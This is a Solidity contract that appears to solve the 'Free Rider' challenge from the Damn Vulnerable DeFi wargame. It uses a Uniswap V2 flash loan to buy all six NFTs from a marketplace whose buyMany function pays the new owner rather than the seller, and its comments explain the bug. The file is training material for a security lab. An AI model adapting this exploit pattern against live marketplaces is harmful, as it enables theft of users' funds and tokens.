// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { FreeRiderNFTMarketplace } from "../free-rider/FreeRiderNFTMarketplace.sol";
import { FreeRiderRecovery } from "../free-rider/FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}


contract HackFreeRider is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    IUniswapV2Pair pair;
    IWETH weth;
    DamnValuableNFT nft;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery devsContract;
    uint256[] nftNumbersArray = [0, 1, 2, 3, 4, 5];

    constructor(
        IUniswapV2Pair _pair,
        IWETH _weth,
        DamnValuableNFT _nft,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecovery _devsContract
    ) {
        pair = _pair;
        weth = _weth;
        nft = _nft;
        marketplace = _marketplace;
        devsContract = _devsContract;
    }

    function flashSwap(uint wethAmount, uint fee) external {
        /**
            @notice
            Define the weth address and the fee as the data to send
        */
        bytes memory data = abi.encode(address(weth), fee);
        /**
            @notice
            Execute the function swap of the pair contract
            This function send us the amount of token A and token B we specified
            The "to" address needs to be a contract and have a uniswapV2Call function to be call
            This function receives the loan and needs to send it back
        */
        pair.swap(wethAmount, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        /** @notice
            Make some checks
        */
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");
        /** @notice
            Deserialize the data received and get the token borrowed address and the fee
        */
        (address tokenBorrowed, uint fee) = abi.decode(data, (address, uint256));
        /** @notice
            Check that the token borrowed is weth
        */
        require(tokenBorrowed == address(weth), "token borrow != WETH");

        /** @notice Withdraw eth in exchange for weth */
        weth.withdraw(amount0);
        
        /**
            @notice
            Executing the buyMany function of the marketplace contract we're going became owner of the nfts.
            The bug: this function transfer nft's ownership before sending the price paid to the owner.
            This way the price paid is sended to the new owner insted of the old one
        */
        marketplace.buyMany{value: 15 ether}(nftNumbersArray);
        
        /** @notice
            Deposit again eth in exchange for weth
        */
        weth.deposit{value: amount0}();
        /** @notice
            Pay back the amount sent to us plus the fee
        */
        weth.transfer(address(pair), amount0 + fee);
    }

    /** @notice
        Need this function in order to receive an nft as a contract
    */
    function onERC721Received(
        address _1,
        address _2,
        uint256 _3,
        bytes calldata _4
    ) external returns(bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    /** @notice
        Once we have the nfts we send them to the devs contract
    */
    function sendNft(uint256 tokenId) public {
        nft.safeTransferFrom(address(this), address(devsContract), tokenId, abi.encode(tx.origin));
    }

    /** @notice
        Need this in order to receive the ether at withdraw it for weth
    */
    receive() external payable {}

}